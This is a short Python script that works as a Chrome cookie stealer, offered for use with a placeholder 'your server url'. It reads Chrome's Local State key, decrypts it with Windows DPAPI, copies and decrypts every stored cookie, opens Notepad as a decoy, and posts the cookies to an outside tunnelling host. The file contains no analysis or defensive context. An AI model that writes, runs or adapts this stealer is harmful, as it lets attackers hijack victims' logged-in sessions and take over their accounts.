from Crypto.Cipher import AES
import win32crypt
import requests
import sqlite3
import base64
import json
import os

url = "https://serveo.net:19040" # your server url
chromePath = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 
                          'Chrome', 'User Data')
localStatePath = os.path.join(chromePath, 'Local State')
cookiesPath = os.path.join(chromePath, 'Default', 'Network', 'Cookies')

def getEncryptionKey():
    try:
        with open(localStatePath, 'r', encoding='utf-8') as file:
            localStateData = json.load(file)
            encryptedKey = localStateData['os_crypt']['encrypted_key']
            keyData = base64.b64decode(encryptedKey.encode('utf-8'))
            return win32crypt.CryptUnprotectData(keyData[5:], None, None, None, 0)[1]
    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        print(f"Error reading the Local State file: {e}")
        exit(0)

def get_cookies():
    key = getEncryptionKey()
    tempCookiesPath = os.path.join(os.environ["TEMP"], "tempcookies.db")
    os.system(f'copy "{cookiesPath}" "{tempCookiesPath}"')

    conn = sqlite3.connect(tempCookiesPath)
    cursor = conn.cursor()
    cursor.execute("""SELECT host_key, name, value, encrypted_value FROM cookies""")

    cookies = []
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if not value:
            if isinstance(encrypted_value, str):
                encrypted_value = bytes(encrypted_value, "utf-8")
            value = AES.new(key, AES.MODE_GCM, encrypted_value[3:15]).decrypt(encrypted_value[15:-16]).decode()

        cookies.append({
            "name": name,
            "value": value,
            "domain": host_key,
        })

    return cookies

# main
def main():
    notepadPath = os.path.join(os.environ['windir'], 'notepad.exe')
    os.startfile(notepadPath)
    requests.post(url, json=get_cookies())

if __name__ == '__main__':
    main()
